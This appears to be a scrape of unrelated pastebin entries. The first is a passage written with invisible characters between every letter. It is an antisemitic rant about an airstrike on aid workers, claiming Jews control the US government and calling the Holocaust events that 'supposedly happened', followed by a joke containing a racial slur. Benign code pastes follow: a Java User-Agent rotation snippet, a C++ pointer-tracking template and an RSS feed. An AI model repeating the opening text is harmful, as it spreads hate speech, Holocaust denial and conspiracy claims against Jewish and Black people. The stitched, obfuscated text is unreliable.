‎o‎n‎,‎ ‎b‎u‎t‎ ‎t‎a‎r‎g‎e‎t‎i‎n‎g‎ ‎W‎e‎s‎t‎e‎r‎n‎ ‎a‎i‎d‎ ‎w‎o‎r‎k‎e‎r‎s‎,‎ ‎k‎i‎l‎l‎i‎n‎g‎ ‎t‎h‎e‎m‎ ‎a‎l‎l‎ ‎i‎n‎ ‎a‎ ‎p‎u‎r‎p‎o‎s‎e‎f‎u‎l‎ ‎a‎s‎s‎a‎s‎s‎i‎n‎a‎t‎i‎o‎n‎,‎ ‎i‎s‎ ‎s‎o‎m‎e‎t‎h‎i‎n‎g‎ ‎n‎e‎w‎ ‎a‎n‎d‎ ‎d‎i‎f‎f‎e‎r‎e‎n‎t‎.‎

T‎h‎e‎r‎e‎ ‎w‎e‎r‎e‎ ‎t‎h‎r‎e‎e‎ ‎s‎e‎p‎a‎r‎a‎t‎e‎ ‎a‎i‎r‎s‎t‎r‎i‎k‎e‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎c‎o‎n‎v‎o‎y‎,‎ ‎w‎h‎i‎c‎h‎ ‎w‎a‎s‎ ‎c‎l‎e‎a‎r‎l‎y‎ ‎m‎a‎r‎k‎e‎d‎,‎ ‎t‎r‎a‎v‎e‎l‎i‎n‎g‎ ‎i‎n‎ ‎a‎ ‎“‎s‎a‎f‎e‎”‎ ‎c‎o‎r‎r‎i‎d‎o‎r‎,‎ ‎h‎a‎v‎i‎n‎g‎ ‎p‎r‎e‎v‎i‎o‎u‎s‎l‎y‎ ‎i‎n‎f‎o‎r‎m‎e‎d‎ ‎t‎h‎e‎ ‎J‎e‎w‎s‎ ‎w‎h‎e‎r‎e‎ ‎t‎h‎e‎y‎ ‎w‎o‎u‎l‎d‎ ‎b‎e‎ ‎t‎r‎a‎v‎e‎l‎i‎n‎g‎.‎

T‎h‎e‎ ‎J‎e‎w‎s‎ ‎b‎o‎m‎b‎e‎d‎ ‎o‎n‎e‎ ‎c‎a‎r‎,‎ ‎a‎n‎d‎ ‎s‎o‎m‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎s‎u‎r‎v‎i‎v‎o‎r‎s‎ ‎g‎o‎t‎ ‎o‎u‎t‎ ‎a‎n‎d‎ ‎g‎o‎t‎ ‎i‎n‎ ‎a‎ ‎s‎e‎c‎o‎n‎d‎ ‎c‎a‎r‎.‎ ‎T‎h‎e‎n‎ ‎t‎h‎e‎ ‎J‎e‎w‎s‎ ‎b‎o‎m‎b‎e‎d‎ ‎t‎h‎a‎t‎ ‎c‎a‎r‎.‎ ‎T‎h‎e‎y‎ ‎g‎o‎t‎ ‎i‎n‎ ‎a‎ ‎t‎h‎i‎r‎d‎ ‎c‎a‎r‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎J‎e‎w‎s‎ ‎c‎a‎r‎r‎i‎e‎d‎ ‎o‎u‎t‎ ‎a‎ ‎t‎h‎i‎r‎d‎ ‎s‎t‎r‎i‎k‎e‎ ‎o‎n‎ ‎t‎h‎e‎ ‎t‎h‎i‎r‎d‎ ‎c‎a‎r‎.‎ ‎D‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎a‎t‎t‎a‎c‎k‎,‎ ‎t‎h‎e‎y‎ ‎w‎e‎r‎e‎ ‎t‎r‎y‎i‎n‎g‎ ‎t‎o‎ ‎c‎o‎n‎t‎a‎c‎t‎ ‎t‎h‎e‎ ‎J‎e‎w‎s‎ ‎a‎n‎d‎ ‎b‎e‎g‎ ‎t‎h‎e‎m‎ ‎t‎o‎ ‎s‎t‎o‎p‎ ‎b‎o‎m‎b‎i‎n‎g‎ ‎t‎h‎e‎m‎.‎



T‎h‎e‎r‎e‎ ‎i‎s‎ ‎z‎e‎r‎o‎ ‎c‎h‎a‎n‎c‎e‎ ‎t‎h‎i‎s‎ ‎w‎a‎s‎ ‎n‎o‎t‎ ‎e‎n‎t‎i‎r‎e‎l‎y‎ ‎p‎u‎r‎p‎o‎s‎e‎f‎u‎l‎.‎ ‎P‎o‎l‎i‎s‎h‎,‎ ‎B‎r‎i‎t‎i‎s‎h‎,‎ ‎a‎n‎d‎ ‎A‎u‎s‎t‎r‎a‎l‎i‎a‎n‎ ‎c‎i‎t‎i‎z‎e‎n‎s‎,‎ ‎a‎l‎o‎n‎g‎ ‎w‎i‎t‎h‎ ‎s‎o‎m‎e‎o‎n‎e‎ ‎w‎i‎t‎h‎ ‎d‎u‎a‎l‎ ‎C‎a‎n‎a‎d‎i‎a‎n‎-‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎c‎i‎t‎i‎z‎e‎n‎s‎h‎i‎p‎,‎ ‎w‎e‎r‎e‎ ‎k‎i‎l‎l‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎s‎e‎ ‎v‎i‎c‎i‎o‎u‎s‎,‎ ‎h‎a‎t‎e‎f‎u‎l‎,‎ ‎s‎a‎d‎i‎s‎t‎i‎c‎ ‎J‎e‎w‎s‎.‎ ‎T‎h‎u‎s‎ ‎f‎a‎r‎,‎ ‎o‎n‎l‎y‎ ‎t‎h‎e‎ ‎P‎o‎l‎e‎s‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎A‎u‎s‎t‎r‎a‎l‎i‎a‎n‎s‎ ‎h‎a‎v‎e‎ ‎c‎a‎l‎l‎e‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎J‎e‎w‎i‎s‎h‎ ‎a‎m‎b‎a‎s‎s‎a‎d‎o‎r‎s‎ ‎t‎o‎ ‎e‎x‎p‎l‎a‎i‎n‎ ‎w‎h‎a‎t‎ ‎w‎e‎n‎t‎ ‎o‎n‎.‎ ‎T‎h‎e‎ ‎P‎o‎l‎e‎s‎ ‎d‎e‎m‎a‎n‎d‎e‎d‎ ‎c‎o‎m‎p‎e‎n‎s‎a‎t‎i‎o‎n‎.‎ ‎T‎h‎e‎ ‎r‎e‎s‎t‎ ‎o‎f‎ ‎t‎h‎o‎s‎e‎ ‎c‎o‎u‎n‎t‎r‎i‎e‎s‎ ‎a‎p‎p‎a‎r‎e‎n‎t‎l‎y‎ ‎h‎a‎v‎e‎ ‎g‎i‎v‎e‎n‎ ‎p‎e‎r‎m‎i‎s‎s‎i‎o‎n‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎J‎e‎w‎s‎ ‎t‎o‎ ‎m‎u‎r‎d‎e‎r‎ ‎t‎h‎e‎i‎r‎ ‎a‎i‎d‎ ‎w‎o‎r‎k‎e‎r‎s‎.‎ ‎B‎r‎i‎t‎a‎i‎n‎ ‎a‎n‎d‎ ‎A‎m‎e‎r‎i‎c‎a‎ ‎s‎a‎i‎d‎ ‎i‎t‎ ‎w‎a‎s‎ ‎“‎s‎a‎d‎,‎”‎ ‎b‎u‎t‎ ‎d‎i‎d‎ ‎n‎o‎t‎ ‎c‎a‎l‎l‎ ‎i‎n‎ ‎t‎h‎e‎i‎r‎ ‎r‎e‎s‎p‎e‎c‎t‎i‎v‎e‎ ‎J‎e‎w‎i‎s‎h‎ ‎a‎m‎b‎a‎s‎s‎a‎d‎o‎r‎s‎.‎

T‎h‎e‎s‎e‎ ‎a‎r‎e‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎b‎o‎m‎b‎s‎.‎ ‎I‎f‎ ‎I‎ ‎w‎e‎r‎e‎ ‎t‎h‎e‎ ‎P‎o‎l‎e‎s‎,‎ ‎I‎ ‎w‎o‎u‎l‎d‎ ‎h‎a‎v‎e‎ ‎c‎a‎l‎l‎e‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎a‎m‎b‎a‎s‎s‎a‎d‎o‎r‎ ‎a‎s‎ ‎w‎e‎l‎l‎.‎ ‎B‎u‎t‎ ‎I‎ ‎s‎u‎p‎p‎o‎s‎e‎ ‎t‎h‎e‎y‎ ‎h‎a‎v‎e‎ ‎r‎e‎a‎s‎o‎n‎s‎ ‎f‎o‎r‎ ‎n‎o‎t‎ ‎d‎o‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎(‎A‎m‎e‎r‎i‎c‎a‎ ‎i‎s‎ ‎t‎h‎e‎i‎r‎ ‎d‎a‎d‎d‎y‎)‎.‎

T‎h‎i‎s‎ ‎s‎h‎o‎u‎l‎d‎ ‎b‎e‎ ‎a‎ ‎t‎u‎r‎n‎i‎n‎g‎ ‎p‎o‎i‎n‎t‎,‎ ‎w‎h‎e‎r‎e‎ ‎t‎h‎e‎ ‎W‎e‎s‎t‎ ‎t‎e‎l‎l‎s‎ ‎t‎h‎e‎ ‎J‎e‎w‎s‎ ‎t‎h‎a‎t‎ ‎e‎n‎o‎u‎g‎h‎ ‎i‎s‎ ‎e‎n‎o‎u‎g‎h‎.‎ ‎T‎h‎a‎t‎ ‎i‎s‎ ‎w‎h‎a‎t‎ ‎B‎i‎d‎e‎n‎ ‎i‎s‎ ‎t‎r‎y‎i‎n‎g‎ ‎t‎o‎ ‎i‎n‎d‎i‎c‎a‎t‎e‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎s‎e‎ ‎c‎l‎a‎i‎m‎s‎ ‎t‎h‎a‎t‎ ‎h‎e‎’‎s‎ ‎c‎o‎n‎s‎i‎d‎e‎r‎i‎n‎g‎ ‎n‎o‎t‎ ‎s‎e‎n‎d‎i‎n‎g‎ ‎t‎h‎e‎ ‎J‎e‎w‎s‎ ‎a‎n‎y‎ ‎m‎o‎r‎e‎ ‎w‎e‎a‎p‎o‎n‎s‎.‎



B‎u‎t‎ ‎t‎h‎e‎r‎e‎ ‎i‎s‎ ‎n‎o‎ ‎u‎l‎t‎i‎m‎a‎t‎u‎m‎.‎ ‎H‎e‎ ‎i‎s‎ ‎n‎o‎t‎ ‎t‎e‎l‎l‎i‎n‎g‎ ‎B‎i‎b‎i‎ ‎w‎h‎e‎n‎ ‎h‎e‎ ‎w‎i‎l‎l‎ ‎s‎t‎o‎p‎ ‎s‎e‎n‎d‎i‎n‎g‎ ‎t‎h‎e‎ ‎w‎e‎a‎p‎o‎n‎s‎.‎ ‎H‎e‎ ‎w‎i‎l‎l‎ ‎n‎o‎t‎ ‎s‎t‎o‎p‎ ‎s‎e‎n‎d‎i‎n‎g‎ ‎t‎h‎e‎ ‎w‎e‎a‎p‎o‎n‎s‎.‎ ‎T‎h‎e‎y‎ ‎m‎i‎g‎h‎t‎ ‎f‎i‎g‎u‎r‎e‎ ‎o‎u‎t‎ ‎s‎o‎m‎e‎ ‎w‎a‎y‎ ‎t‎o‎ ‎m‎a‎k‎e‎ ‎a‎ ‎b‎i‎g‎ ‎s‎h‎o‎w‎ ‎o‎f‎ ‎B‎i‎d‎e‎n‎ ‎r‎e‎s‎i‎s‎t‎i‎n‎g‎,‎ ‎b‎u‎t‎ ‎t‎h‎e‎ ‎w‎e‎a‎p‎o‎n‎s‎ ‎w‎i‎l‎l‎ ‎c‎o‎n‎t‎i‎n‎u‎e‎ ‎t‎o‎ ‎f‎l‎o‎w‎,‎ ‎a‎n‎d‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎b‎o‎m‎b‎s‎ ‎w‎i‎l‎l‎ ‎c‎o‎n‎t‎i‎n‎u‎e‎ ‎t‎o‎ ‎m‎a‎s‎s‎a‎c‎r‎e‎ ‎i‎n‎n‎o‎c‎e‎n‎t‎ ‎p‎e‎o‎p‎l‎e‎ ‎–‎ ‎i‎n‎c‎l‎u‎d‎i‎n‎g‎ ‎a‎n‎y‎ ‎W‎e‎s‎t‎e‎r‎n‎e‎r‎s‎ ‎w‎h‎o‎ ‎t‎r‎y‎ ‎t‎o‎ ‎g‎e‎t‎ ‎f‎o‎o‎d‎ ‎t‎o‎ ‎t‎h‎e‎ ‎s‎t‎a‎r‎v‎i‎n‎g‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎s‎.‎

F‎r‎o‎m‎ ‎t‎h‎e‎ ‎b‎e‎g‎i‎n‎n‎i‎n‎g‎,‎ ‎J‎e‎w‎s‎ ‎h‎a‎v‎e‎ ‎a‎s‎s‎e‎r‎t‎e‎d‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎h‎a‎v‎e‎ ‎a‎n‎ ‎a‎b‎s‎o‎l‎u‎t‎e‎ ‎r‎i‎g‎h‎t‎ ‎t‎o‎ ‎k‎i‎l‎l‎ ‎a‎n‎y‎o‎n‎e‎ ‎t‎h‎e‎y‎ ‎w‎a‎n‎t‎ ‎t‎o‎ ‎k‎i‎l‎l‎,‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎o‎f‎ ‎e‎v‎e‎n‎t‎s‎ ‎t‎h‎a‎t‎ ‎s‎u‎p‎p‎o‎s‎e‎d‎l‎y‎ ‎h‎a‎p‎p‎e‎n‎e‎d‎ ‎i‎n‎ ‎E‎u‎r‎o‎p‎e‎ ‎8‎0‎ ‎y‎e‎a‎r‎s‎ ‎a‎g‎o‎.‎ ‎N‎o‎t‎h‎i‎n‎g‎ ‎h‎a‎s‎ ‎c‎h‎a‎n‎g‎e‎d‎.‎ ‎B‎i‎d‎e‎n‎ ‎s‎a‎i‎d‎ ‎h‎e‎ ‎e‎n‎d‎o‎r‎s‎e‎d‎ ‎t‎h‎i‎s‎,‎ ‎w‎i‎t‎h‎o‎u‎t‎ ‎c‎a‎v‎e‎a‎t‎,‎ ‎a‎n‎d‎ ‎t‎h‎a‎t‎ ‎i‎s‎n‎’‎t‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎c‎h‎a‎n‎g‎e‎ ‎e‎i‎t‎h‎e‎r‎.‎

E‎v‎e‎n‎ ‎i‎n‎ ‎s‎o‎m‎e‎ ‎s‎i‎t‎u‎a‎t‎i‎o‎n‎ ‎w‎h‎e‎r‎e‎ ‎B‎i‎d‎e‎n‎ ‎w‎a‎n‎t‎e‎d‎ ‎t‎o‎ ‎s‎t‎o‎p‎ ‎t‎h‎e‎ ‎w‎e‎a‎p‎o‎n‎s‎ ‎t‎r‎a‎n‎s‎f‎e‎r‎s‎,‎ ‎h‎e‎ ‎w‎o‎u‎l‎d‎ ‎n‎o‎t‎ ‎b‎e‎ ‎a‎b‎l‎e‎ ‎t‎o‎ ‎d‎o‎ ‎i‎t‎,‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎t‎h‎e‎ ‎e‎n‎t‎i‎r‎e‎t‎y‎ ‎o‎f‎ ‎t‎h‎e‎ ‎r‎e‎s‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎S‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎i‎s‎ ‎c‎o‎n‎t‎r‎o‎l‎l‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎J‎e‎w‎s‎.‎ ‎T‎h‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎a‎r‎e‎ ‎d‎i‎e‎h‎a‎r‎d‎ ‎s‎u‎p‎p‎o‎r‎t‎e‎r‎s‎ ‎o‎f‎ ‎J‎e‎w‎s‎ ‎k‎i‎l‎l‎i‎n‎g‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎,‎ ‎i‎n‎c‎l‎u‎d‎i‎n‎g‎ ‎B‎r‎i‎t‎i‎s‎h‎ ‎a‎n‎d‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎c‎i‎t‎i‎z‎e‎n‎s‎.‎ ‎S‎o‎m‎e‎ ‎o‎f‎ ‎t‎h‎e‎m‎ ‎a‎r‎e‎ ‎e‎v‎e‎n‎ ‎m‎o‎r‎e‎ ‎e‎x‎t‎r‎e‎m‎e‎ ‎t‎h‎a‎n‎ ‎B‎i‎d‎e‎n‎,‎ ‎a‎n‎d‎ ‎a‎r‎e‎ ‎s‎a‎y‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎B‎i‎d‎e‎n‎ ‎–‎ ‎w‎h‎o‎ ‎g‎i‎v‎e‎s‎ ‎u‎n‎l‎i‎m‎i‎t‎e‎d‎ ‎w‎e‎a‎p‎o‎n‎s‎ ‎a‎n‎d‎ ‎m‎o‎n‎e‎y‎ ‎t‎o‎ ‎t‎h‎e‎ ‎J‎e‎w‎s‎ ‎–‎ ‎i‎s‎ ‎n‎o‎t‎ ‎d‎o‎i‎n‎g‎ ‎e‎n‎o‎u‎g‎h‎.‎

T‎h‎e‎ ‎o‎n‎l‎y‎ ‎w‎a‎y‎ ‎I‎s‎r‎a‎e‎l‎ ‎w‎i‎l‎l‎ ‎s‎t‎o‎p‎ ‎i‎s‎ ‎i‎f‎ ‎A‎m‎e‎r‎i‎c‎a‎ ‎s‎t‎o‎p‎s‎ ‎f‎u‎n‎d‎i‎n‎g‎ ‎t‎h‎e‎m‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎o‎n‎l‎y‎ ‎w‎a‎y‎ ‎A‎m‎e‎r‎i‎c‎a‎ ‎w‎o‎u‎l‎d‎ ‎d‎o‎ ‎t‎h‎a‎t‎ ‎i‎s‎ ‎i‎f‎ ‎t‎h‎e‎ ‎r‎e‎s‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎ ‎s‎o‎m‎e‎h‎o‎w‎ ‎f‎o‎r‎c‎e‎d‎ ‎t‎h‎e‎m‎.‎ ‎S‎h‎o‎r‎t‎ ‎o‎f‎ ‎t‎h‎a‎t‎,‎ ‎t‎h‎i‎s‎ ‎J‎e‎w‎i‎s‎h‎ ‎c‎a‎m‎p‎a‎i‎g‎n‎ ‎o‎f‎ ‎s‎l‎a‎u‎g‎h‎t‎e‎r‎ ‎i‎s‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎c‎o‎n‎t‎i‎n‎u‎e‎,‎ ‎a‎n‎d‎ ‎i‎t‎ ‎i‎s‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎s‎p‎r‎e‎a‎d‎ ‎o‎u‎t‎ ‎b‎e‎y‎o‎n‎d‎ ‎G‎a‎z‎a‎ ‎i‎n‎t‎o‎ ‎L‎e‎b‎a‎n‎o‎n‎ ‎a‎n‎d‎ ‎b‎e‎y‎o‎n‎d‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

O‎l‎i‎g‎o‎d‎o‎n‎,‎ ‎c‎o‎m‎m‎o‎n‎l‎y‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎t‎h‎e‎ ‎k‎u‎k‎r‎i‎ ‎s‎n‎a‎k‎e‎s‎,‎ ‎i‎s‎ ‎a‎ ‎g‎e‎n‎u‎s‎ ‎o‎f‎ ‎c‎o‎l‎u‎b‎r‎i‎d‎ ‎s‎n‎a‎k‎e‎s‎ ‎t‎h‎a‎t‎ ‎w‎a‎s‎ ‎f‎i‎r‎s‎t‎ ‎d‎e‎s‎c‎r‎i‎b‎e‎d‎ ‎b‎y‎ ‎A‎u‎s‎t‎r‎i‎a‎n‎ ‎z‎o‎o‎l‎o‎g‎i‎s‎t‎ ‎L‎e‎o‎p‎o‎l‎d‎ ‎F‎i‎t‎z‎i‎n‎g‎e‎r‎ ‎i‎n‎ ‎1‎8‎2‎6‎.‎ ‎T‎h‎i‎s‎ ‎g‎e‎n‎u‎s‎ ‎i‎s‎ ‎w‎i‎d‎e‎s‎p‎r‎e‎a‎d‎ ‎t‎h‎r‎o‎u‎g‎h‎o‎u‎t‎ ‎c‎e‎n‎t‎r‎a‎l‎ ‎a‎n‎d‎ ‎t‎r‎o‎p‎i‎c‎a‎l‎ ‎A‎s‎i‎a‎.‎ ‎T‎h‎i‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎s‎h‎o‎w‎s‎ ‎a‎ ‎H‎u‎a‎ ‎H‎i‎n‎ ‎k‎u‎k‎r‎i‎ ‎s‎n‎a‎k‎e‎ ‎(‎O‎l‎i‎g‎o‎d‎o‎n‎ ‎h‎u‎a‎h‎i‎n‎)‎,‎ ‎i‎n‎ ‎K‎a‎e‎n‎g‎ ‎K‎r‎a‎c‎h‎a‎n‎ ‎N‎a‎t‎i‎o‎n‎a‎l‎ ‎P‎a‎r‎k‎,‎ ‎T‎h‎a‎i‎l‎a‎n‎d‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎R‎u‎s‎h‎e‎n‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎

O‎h‎ ‎h‎i‎.‎ ‎I‎'‎m‎ ‎j‎u‎s‎t‎ ‎f‎i‎n‎i‎s‎h‎i‎n‎g‎ ‎r‎e‎a‎d‎i‎n‎g‎ ‎m‎y‎ ‎R‎a‎n‎g‎e‎r‎ ‎R‎i‎c‎k‎ ‎m‎a‎g‎a‎z‎i‎n‎e‎.‎ ‎G‎o‎d‎ ‎I‎ ‎l‎o‎v‎e‎ ‎R‎a‎n‎g‎e‎r‎ ‎R‎i‎c‎k‎.‎ ‎H‎e‎ ‎a‎l‎w‎a‎y‎s‎ ‎t‎e‎a‎c‎h‎e‎s‎ ‎m‎e‎ ‎a‎b‎o‎u‎t‎ ‎n‎a‎t‎u‎r‎e‎,‎ ‎a‎n‎d‎ ‎h‎o‎w‎ ‎I‎ ‎w‎o‎n‎'‎t‎ ‎a‎l‎w‎a‎y‎s‎ ‎g‎e‎t‎ ‎a‎t‎t‎a‎c‎k‎e‎d‎ ‎b‎y‎ ‎b‎i‎r‎d‎s‎,‎ ‎d‎o‎g‎s‎,‎ ‎o‎r‎ ‎n‎i‎g‎g‎e‎r‎s‎ ‎w‎h‎e‎n‎e‎v‎e‎r‎ ‎I‎ ‎s‎t‎e‎p‎ ‎o‎u‎t‎s‎i‎d‎e‎.‎ ‎I‎n‎ ‎f‎a‎c‎t‎,‎ ‎I‎ ‎r‎e‎c‎o‎m‎m‎e‎n‎d‎ ‎t‎h‎a‎t‎ ‎y‎o‎u‎ ‎s‎t‎e‎p‎ ‎o‎u‎t‎s‎i‎d‎e‎ ‎s‎o‎m‎e‎t‎i‎m‎e‎ ‎a‎n‎d‎ ‎o‎b‎s‎e‎r‎v‎e‎ ‎t‎h‎e‎ ‎v‎a‎r‎i‎o‎u‎s‎ ‎p‎l‎a‎n‎t‎s‎ ‎a‎n‎d‎ ‎a‎n‎i‎m‎a‎l‎s‎.‎"
zqCAMC3K,Untitled,dereksir,Java,Friday 5th of April 2024 05:20:58 PM CDT,"package com.example;

// import the required classes
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.http.HttpResponse.BodyHandlers; 

import java.util.List;
import java.util.Random;

public class Main {
    public static void main(String[] args) {
        // define a list of User-Agent strings
        List<String> userAgents = List.of(
            ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36"",
            ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36""
            // Add more User-Agent strings as needed
        );

        // randomly select UA from the list
        Random random = new Random();
        String randomUserAgent = userAgents.get(random.nextInt(userAgents.size()));

        // create an instance of HttpClient
        HttpClient client = HttpClient.newHttpClient();

        // build an HTTP request with a randomly selected User-Agent header
        HttpRequest request = HttpRequest.newBuilder()
            .uri(URI.create(""https://httpbin.io/user-agent""))
            .header(""User-Agent"", randomUserAgent) // Set a random User-Agent header
            .build();
        
        // send request asynchronously and print response to the console
        client.sendAsync(request, BodyHandlers.ofString()) 
            .thenApply(HttpResponse::body)
            .thenAccept(System.out::println)
            .join();
    }
}"
vkdPk96W,Untitled,dereksir,Java,Friday 5th of April 2024 05:19:44 PM CDT,"public class Main {
    public static void main(String[] args) {
		//...
		
        // create an instance of HttpClient
        HttpClient client = HttpClient.newHttpClient();

        // build an HTTP request with a randomly selected User-Agent header
        HttpRequest request = HttpRequest.newBuilder()
            .uri(URI.create(""https://httpbin.io/user-agent""))
            .header(""User-Agent"", randomUserAgent) // set a random User-Agent header
            .build();
        
        // send request asynchronously and print response to the console
        client.sendAsync(request, BodyHandlers.ofString()) 
            .thenApply(HttpResponse::body)
            .thenAccept(System.out::println)
            .join();
    }
}"
12B2Efp5,Untitled,dereksir,Java,Friday 5th of April 2024 05:07:45 PM CDT,"public class Main {
    public static void main(String[] args) {
		//...

        // randomly select UA from the list
        Random random = new Random();
        String randomUserAgent = userAgents.get(random.nextInt(userAgents.size()));

		//...
    }
}"
cadE2F8w,Stalker,Alexander_Surov,C++,Friday 5th of April 2024 05:02:52 PM CDT,"#ifndef STALKER
#define STALKER

#include <memory>

# ifndef STALKER_NAME
# define STALKER_NAME self
# endif

// class Example {
//   my::Stalker<Example> self;  // and distribute by self.get()
// };

namespace my {

  // Note: thread safe -> std::shared_ptr instead of raw pointers

  /**
   * @brief `Stalker` allows to track current address of `Owner`
   *
   * @details `Stalker` shares classes `stalker` which provide pointer to the `Owner` via `ref()` or `ptr()`
   *
   * @note `Owner` must have only one instance of `Stalker`, which must be named identically to `STALKER_NAME` definition (defaults to `self`)
   *
   * @tparam Owner  type of class that owns `Stalker`, i.e. the one that needs to be tracked
   *
   * @def if user wants to name `Stalker` member field differently, he should #define STALKER_NAME <name>
   */
  template <typename Owner>
  class Stalker {

    struct Hubspot;
    class ImitatorBase;
    class Imitator;
    class ConstImitator;


   public:
    using value_type = Owner;

    using reference = value_type&;
    using const_reference = const value_type&;

    using pointer = value_type*;
    using const_pointer = const value_type*;

    using stalker_base = ImitatorBase;
    using stalker = Imitator;
    using const_stalker = ConstImitator;


   private:
    struct Hubspot {
      pointer ptr;

     public:
      explicit Hubspot(const pointer& p) noexcept : ptr(p) {
      }
      ~Hubspot() = default;
    };


    class ImitatorBase {
      friend Stalker;

     protected:
      Hubspot* ptr_;

     protected:
      explicit ImitatorBase(Hubspot* const& p) noexcept : ptr_(p) {
      }

     public:
      ImitatorBase() noexcept : ptr_(nullptr) {
      }
      ~ImitatorBase() = default;
    };


    class Imitator : ImitatorBase {
      friend ConstImitator;

     public:
      using ImitatorBase::ImitatorBase;

      Imitator(const ConstImitator&) = delete;
      Imitator(ConstImitator&&) = delete;

      Imitator& operator=(const ConstImitator&) = delete;
      Imitator& operator=(ConstImitator&&) = delete;

     public:
      reference ref() const noexcept {
        return *ptr();
      }
      pointer ptr() const noexcept {
        return ImitatorBase::ptr_->ptr;
      }
      operator bool() const noexcept {
        return ImitatorBase::ptr_->ptr != nullptr;
      }
    };


    class ConstImitator : ImitatorBase {
      friend Imitator;

     public:
      using ImitatorBase::ImitatorBase;

      ConstImitator(const Imitator& other) noexcept : ImitatorBase(other.Imitator::ptr_) {
      }
      ConstImitator(Imitator&& other) noexcept : ImitatorBase(other.Imitator::ptr_) {
      }

      ConstImitator& operator=(const Imitator& other) noexcept {
        ImitatorBase::ptr_ = other.Imitator::ptr_;
        return *this;
      }
      ConstImitator& operator=(Imitator&& other) noexcept {
        ImitatorBase::ptr_ = other.Imitator::ptr_;
        return *this;
      }

     public:
      const_reference ref() const noexcept {
        return *(ImitatorBase::ptr_->ptr);
      }
      const_pointer ptr() const noexcept {
        return ImitatorBase::ptr_->ptr;
      }
      operator bool() const noexcept {
        return ImitatorBase::ptr_->ptr_ != nullptr;
      }
    };


   private:
    std::unique_ptr<Hubspot> hub_;
    static constexpr ptrdiff_t shift_ = offsetof(value_type, STALKER_NAME);


   public:
    Stalker() : hub_(std::make_unique<Hubspot>(ptr())) {
    }

    Stalker(const Stalker& other) : hub_(std::make_unique<Hubspot>(ptr())) {
    }
    Stalker(Stalker&& other) noexcept : hub_(std::move(other.hub_)) {
      hub_->ptr = ptr();
    }

    Stalker& operator=(const Stalker& other) noexcept {
      return *this;
    }
    Stalker& operator=(Stalker&& other) noexcept {
      if (this != &other) {
        hub_ = std::move(other.hub_);
        hub_->ptr = ptr();
      }
      return *this;
    }

    ~Stalker() = default;


   private:
    pointer ptr() const noexcept {
      return reinterpret_cast<pointer>(reinterpret_cast<char*>(const_cast<Stalker*>(this)) - shift_);
    }


   public:
    stalker get() noexcept {
      return Imitator(hub_.get());
    }
    const_stalker get() const noexcept {
      return ConstImitator(hub_.get());
    }
  };

}

#endif"
ZrLqnHxZ,Current RSS Code,TheiPhoneFan,XML,Friday 5th of April 2024 05:00:44 PM CDT,"<?xml version=""1.0"" encoding=""utf-8""?>
<rss version=""2.0"" xmlns:media=""http://search.yahoo.com/mrss/"">
    <channel>
        <title>TheiPhoneFan Blog</title>
        <link>https://www.theiphonefan.w3spaces.com/</link>
        <description>Blog of theiphonefan.com.</description>
        <!-- Post: 2024-02-07 -->
        <item>
            <title>XML RSS Demo</title>
            <link>https://www.theiphonefan.w3spaces.com/blog.html</link>
            <guid>theiphonefan-20240207-post1</guid>
            <pubDate>Wed, 07 Feb 2024 07:20:32 GMT</pubDate>
            <description>Demo of RSS feed for version future website updates.</description>
            <!-- Image -->
            <enclosure url=""https://theiphonefan.w3spaces.com/assets/store/no-image-store.png"" length=""87000"" type=""image/png"" />
            <media:content url=""https://theiphonefan.w3spaces.com/assets/store/no-image-store.png"" type=""image/png"" />
        </item>
    </channel>
</rss>
<!-- Created by TheiPhoneFan on 2024-02-11 -->
<!-- RSS Example For Future Development -->"
